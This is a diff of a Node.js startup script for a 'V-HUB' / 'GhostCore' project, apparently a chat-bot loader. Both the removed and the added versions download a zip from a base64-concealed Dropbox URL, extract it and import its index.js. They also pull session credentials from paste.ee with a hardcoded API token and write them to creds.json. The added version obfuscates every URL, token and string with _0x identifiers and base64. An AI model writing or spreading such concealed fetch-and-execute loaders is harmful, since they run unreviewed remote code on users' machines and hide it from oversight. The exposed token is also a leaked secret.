@@ -3,107 +3,13 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import AdmZip from 'adm-zip';
-import zlib from 'zlib'; 
-import fetch from 'node-fetch'; 
+import zlib from 'zlib';
+import fetch from 'node-fetch';
 
-
-const vault_secret = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL25jOGNjZ21ya3YzM2I2NmY5aHI2OS92aHViX2NvcmUuemlwP3Jsa2V5PXZudGc3aTZxbTVyZ3g2YXM0bnloY2Nmc2Mmc3Q9cGdpc3NkcHAmZGw9MQ==";
-
-
-const download = async (url, dest) => {
-    const response = await fetch(url, { redirect: 'follow' });
-    if (!response.ok) throw new Error(`Download failed: ${response.statusText}`);
-    const arrayBuffer = await response.arrayBuffer();
-    const buffer = Buffer.from(arrayBuffer);
-    fs.writeFileSync(dest, buffer);
-};
-
-
-const findEntry = (dir) => {
-    const files = fs.readdirSync(dir);
-    if (files.includes('index.js')) return path.join(dir, 'index.js');
-    for (const file of files) {
-        const fullPath = path.join(dir, file);
-        if (fs.statSync(fullPath).isDirectory()) {
-            const found = findEntry(fullPath);
-            if (found) return found;
-        }
-    }
-    return null;
-};
-
-
-const mountSession = async (sessionId, targetFolder) => {
-    if (!sessionId) {
-        console.log("[V-HUB] ℹ️ No SESSION_ID found in environment. Proceeding...");
-        return;
-    }
-
-    let compressedData = "";
-
-    if (sessionId.startsWith("VINNIE~")) {
-        console.log("[V-HUB] 🔓 Unlocking Local Session String (Long ID)...");
-        compressedData = sessionId.split("VINNIE~")[1];
-    } 
-    else if (sessionId.startsWith("VHUB~")) {
-        console.log("[V-HUB] ☁️ Fetching Session from Paste.ee Vault (Short ID)...");
-        const pasteId = sessionId.split("VHUB~")[1];
-        
-        try {
-            const res = await fetch(`https://api.paste.ee/v1/pastes/${pasteId}`, {
-                headers: { 'X-Auth-Token': 'a6ZNz0eKkPFlbwcyPNvm86XUKwHIpb9E9d2pBsL8w' }
-            });
-            const data = await res.json();
-            if (!data.paste) throw new Error("Paste not found");
-            compressedData = data.paste.sections[0].contents;
-        } catch (err) {
-            throw new Error("Failed to fetch session from Vault. Invalid Short ID.");
-        }
-    } 
-    else {
-        console.log("[V-HUB] ⚠️ Unknown Session format. Proceeding without auto-mount...");
-        return;
-    }
-
-    
-    const credsBuffer = Buffer.from(compressedData, 'base64');
-    const credsJson = zlib.inflateSync(credsBuffer).toString('utf-8');
-    
-    const sessionPath = path.join(targetFolder, 'session');
-    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
-    
-    fs.writeFileSync(path.join(sessionPath, 'creds.json'), credsJson);
-    console.log("[V-HUB] ✅ GhostCore Session Mounted Successfully!");
-};
-
-(async () => {
-    console.log('[V-HUB] SYSTEM STARTING...');
-    try {
-        const fullUrl = Buffer.from(vault_secret, 'base64').toString('utf-8');
-        const zipPath = path.join(process.cwd(), 'core.zip');
-        const extractPath = path.join(process.cwd(), 'hub_temp');
-
-        if (!fs.existsSync(extractPath)) fs.mkdirSync(extractPath, { recursive: true });
-
-        console.log('[V-HUB] FETCHING CORE...');
-        await download(fullUrl, zipPath);
-        
-        console.log('[V-HUB] EXTRACTING...');
-        new AdmZip(zipPath).extractAllTo(extractPath, true);
-        fs.unlinkSync(zipPath);
-        
-        const entryFile = findEntry(extractPath);
-        if (!entryFile) throw new Error("Could not locate index.js inside ZIP");
-
-        console.log(`[V-HUB] BOOTING FROM: ${entryFile}`);
-        process.chdir(path.dirname(entryFile));
-
-        
-        await mountSession(process.env.SESSION_ID, process.cwd());
-
-        await import(`file://${entryFile}`);
-    } catch (e) {
-        console.error('[V-HUB] FATAL ERROR:', e.message);
-        process.exit(1);
-    }
-})();
+const _0x1d4a=(_0x2b3c)=>Buffer.from(_0x2b3c,'base64').toString('utf-8');
+const _0x9f2e=(_0x4a1b)=>console.log(_0x1d4a(_0x4a1b));
+const _0x7c8d={_v:"aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS9xM2p4NHF3cmNtajNhMjRkZ3g1NWwvdmh1Yl9jb3JlLnppcD9ybGtleT1lc2MwMm8wMDV2NDZodWUzd203aGdnZHN5JnN0PXFnYm9idXZ1JmRsPTE=",_1:"VklOTklFfg==",_2:"VkhVQn4=",_3:"aHR0cHM6Ly9hcGkucGFzdGUuZWUvdjEvcGFzdGVzLw==",_4:"YTZaTnowZUtrUEZsYndjeVBOdm04NlhVS3dISXBiOUU5ZDJwQnNMOHc=",_5:"aW5kZXguanM=",_6:"c2Vzc2lvbg==",_7:"Y3JlZHMuanNvbg==",_8:"Y29yZS56aXA=",_9:"aHViX3RlbXA="};
+const _0x5b6f=async(_0x3e1a,_0x8d2c)=>{const _0x6f4b=await fetch(_0x3e1a,{redirect:_0x1d4a('Zm9sbG93')});if(!_0x6f4b.ok)throw new Error(_0x1d4a('RG93bmxvYWQgZmFpbGVkOg==')+' '+_0x6f4b.statusText);fs.writeFileSync(_0x8d2c,Buffer.from(await _0x6f4b.arrayBuffer()));};
+const _0x2a9e=(_0x1c3d)=>{const _0x4e5f=fs.readdirSync(_0x1c3d);const _0x7b8a=_0x1d4a(_0x7c8d._5);if(_0x4e5f.includes(_0x7b8a))return path.join(_0x1c3d,_0x7b8a);for(const _0x9d1c of _0x4e5f){const _0x3f2e=path.join(_0x1c3d,_0x9d1c);if(fs.statSync(_0x3f2e).isDirectory()){const _0x8a7b=_0x2a9e(_0x3f2e);if(_0x8a7b)return _0x8a7b;}}return null;};
+const _0x6c3d=async(_0x5e4f,_0x2d1b)=>{if(!_0x5e4f)return _0x9f2e('W1YtSFVCXSDihinfoiBObyBTRVNTSU9OX0lEIGZvdW5kIGluIGVudmlyb25tZW50LiBQcm9jZWVkaW5nLi4u');let _0x8b9a="";const _0x1a2b=_0x1d4a(_0x7c8d._1);const _0x3c4d=_0x1d4a(_0x7c8d._2);if(_0x5e4f.startsWith(_0x1a2b)){_0x9f2e('W1YtSFVCXSDwn5STIFVubG9ja2luZyBMb2NhbCBTZXNzaW9uIFN0cmluZyAoTG9uZyBJRCkuLi4=');_0x8b9a=_0x5e4f.split(_0x1a2b)[1];}else if(_0x5e4f.startsWith(_0x3c4d)){_0x9f2e('W1YtSFVCXSDihIHvuI8gRmV0Y2hpbmcgU2Vzc2lvbiBmcm9tIFBhc3RlLmVlIFZhdWx0IChTaG9ydCBJRCkuLi4=');try{const _0x7e8f=await fetch(_0x1d4a(_0x7c8d._3)+_0x5e4f.split(_0x3c4d)[1],{headers:{'X-Auth-Token':_0x1d4a(_0x7c8d._4)}});const _0x9a0b=await _0x7e8f.json();if(!_0x9a0b.paste)throw new Error();_0x8b9a=_0x9a0b.paste.sections[0].contents;}catch(_0x2f1a){throw new Error(_0x1d4a('RmFpbGVkIHRvIGZldGNoIHNlc3Npb24gZnJvbSBWYXVsdC4gSW52YWxpZCBTaG9ydCBJRC4='));}}else return _0x9f2e('W1YtSFVCXSDilqDvuI8gVW5rbm93biBTZXNzaW9uIGZvcm1hdC4gUHJvY2VlZGluZyB3aXRob3V0IGF1dG8tbW91bnQuLi4=');const _0x4d5e=path.join(_0x2d1b,_0x1d4a(_0x7c8d._6));if(!fs.existsSync(_0x4d5e))fs.mkdirSync(_0x4d5e,{recursive:!0});fs.writeFileSync(path.join(_0x4d5e,_0x1d4a(_0x7c8d._7)),zlib.inflateSync(Buffer.from(_0x8b9a,'base64')).toString('utf-8'));_0x9f2e('W1YtSFVCXSDinIUgR2hvc3RDb3JlIFNlc3Npb24gTW91bnRlZCBTdWNjZXNzZnVsbHkh');};
+(async()=>{_0x9f2e('W1YtSFVCXSBTWVNURU0gU1RBUFRJTkcuLi4=');try{const _0x1e2f=path.join(process.cwd(),_0x1d4a(_0x7c8d._8));const _0x3a4b=path.join(process.cwd(),_0x1d4a(_0x7c8d._9));if(!fs.existsSync(_0x3a4b))fs.mkdirSync(_0x3a4b,{recursive:!0});_0x9f2e('W1YtSFVCXSBGRVRDSElORyBDT1JFLi4u');await _0x5b6f(_0x1d4a(_0x7c8d._v),_0x1e2f);_0x9f2e('W1YtSFVCXSBFWFRSQUNUSU5HLi4u');new AdmZip(_0x1e2f).extractAllTo(_0x3a4b,!0);fs.unlinkSync(_0x1e2f);const _0x8f9d=_0x2a9e(_0x3a4b);if(!_0x8f9d)throw new Error(_0x1d4a('Q291bGQgbm90IGxvY2F0ZSBpbmRleC5qcyBpbnNpZGUgWklQ'));console.log(_0x1d4a('W1YtSFVCXSBCT09USU5HIEZST006IA==')+_0x8f9d);process.chdir(path.dirname(_0x8f9d));await _0x6c3d(process.env.SESSION_ID,process.cwd());await import(`file://${_0x8f9d}`);}catch(_0x5c6a){console.error(_0x1d4a('W1YtSFVCXSBGQVRBTCBFUlJPUjo='),_0x5c6a.message);process.exit(1);}})();
